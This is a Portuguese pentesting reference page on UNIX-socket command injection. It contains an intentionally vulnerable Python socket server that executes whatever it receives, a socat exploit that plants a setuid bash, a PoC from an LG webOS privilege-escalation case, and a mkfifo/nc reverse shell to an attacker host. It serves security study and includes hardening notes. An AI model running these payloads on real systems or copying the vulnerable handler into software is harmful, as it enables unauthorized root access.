# Injeção de Comandos por Socket

{{#include ../../banners/hacktricks-training.md}}

## Exemplo de binding de socket com Python

No exemplo a seguir, um **unix socket é criado** (`/tmp/socket_test.s`) e tudo o que for **recebido** será **executado** por `os.system`. Sei que você não encontrará isso em um ambiente real, mas o objetivo deste exemplo é mostrar como é o código que usa unix sockets e como gerenciar a entrada no pior caso possível.
```python:s.py
import socket
import os, os.path
import time
from collections import deque

if os.path.exists("/tmp/socket_test.s"):
os.remove("/tmp/socket_test.s")

server = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
server.bind("/tmp/socket_test.s")
os.system("chmod o+w /tmp/socket_test.s")
while True:
server.listen(1)
conn, addr = server.accept()
datagram = conn.recv(1024)
if datagram:
print(datagram)
os.system(datagram)
conn.close()
```
**Execute** o código usando python: `python s.py` e **verifique como o socket está escutando**:
```python
netstat -a -p --unix | grep "socket_test"
(Not all processes could be identified, non-owned process info
will not be shown, you would have to be root to see it all.)
unix  2      [ ACC ]     STREAM     LISTENING     901181   132748/python        /tmp/socket_test.s
```
**Exploit**
```python
echo "cp /bin/bash /tmp/bash; chmod +s /tmp/bash; chmod +x /tmp/bash;" | socat - UNIX-CLIENT:/tmp/socket_test.s
```
## Estudo de caso: escalação acionada por sinal via UNIX socket de propriedade do root (LG webOS)

Alguns daemons privilegiados expõem um UNIX socket de propriedade do root que aceita entradas não confiáveis e associa ações privilegiadas a IDs de thread e sinais. Se o protocolo permitir que um cliente sem privilégios influencie qual thread nativa será direcionada, talvez seja possível acionar um caminho de código privilegiado e obter escalação.<sup>[[1]](#references)</sup>

Padrão observado:
- Conectar-se a um socket de propriedade do root (por exemplo, /tmp/remotelogger).
- Criar uma thread e obter seu ID nativo de thread (TID).
- Enviar o TID (empacotado) junto com padding como uma requisição; receber uma confirmação.
- Entregar um sinal específico a esse TID para acionar o comportamento privilegiado.

Esboço mínimo de PoC:
```python
import socket, struct, os, threading, time
# Spawn a thread so we have a TID we can signal
th = threading.Thread(target=time.sleep, args=(600,)); th.start()
tid = th.native_id  # Python >=3.8
s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.connect("/tmp/remotelogger")
s.sendall(struct.pack('<L', tid) + b'A'*0x80)
s.recv(4)  # sync
os.kill(tid, 4)  # deliver SIGILL (example from the case)
```
Para transformar isso em um root shell, um padrão simples de named-pipe + nc pode ser usado:
```bash
rm -f /tmp/f; mkfifo /tmp/f
cat /tmp/f | /bin/sh -i 2>&1 | nc <ATTACKER-IP> 23231 > /tmp/f
```
Notas:
- Esta classe de bugs surge ao confiar em valores derivados do estado do cliente sem privilégios (TIDs) e vinculá-los a signal handlers ou lógica privilegiados.
- Reforce a segurança impondo credenciais no socket, validando formatos de mensagens e desvinculando operações privilegiadas de identificadores de threads fornecidos externamente.

## Referências

- [1] [LG WebOS TV Path Traversal, Authentication Bypass and Full Device Takeover (SSD Disclosure)](https://ssd-disclosure.com/lg-webos-tv-path-traversal-authentication-bypass-and-full-device-takeover/)

{{#include ../../banners/hacktricks-training.md}}
